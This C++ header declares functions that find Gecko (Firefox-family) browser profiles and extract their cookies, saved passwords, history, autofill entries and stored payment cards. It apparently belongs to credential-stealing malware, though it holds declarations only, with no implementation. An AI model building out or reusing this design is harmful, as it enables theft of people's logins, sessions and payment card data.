#pragma once
#include <vector>
#include <string>
namespace features {
    std::vector<std::string> get_gecko_profiles();
    void extract_gecko_cookies(std::vector<std::string>& profiles);
    void extract_gecko_passwords(std::vector<std::string>& profiles);
    void extract_gecko_history(std::vector<std::string>& profiles);
    void extract_gecko_autofill(std::vector<std::string>& profiles);
    void extract_gecko_cards(std::vector<std::string>& profiles);
}
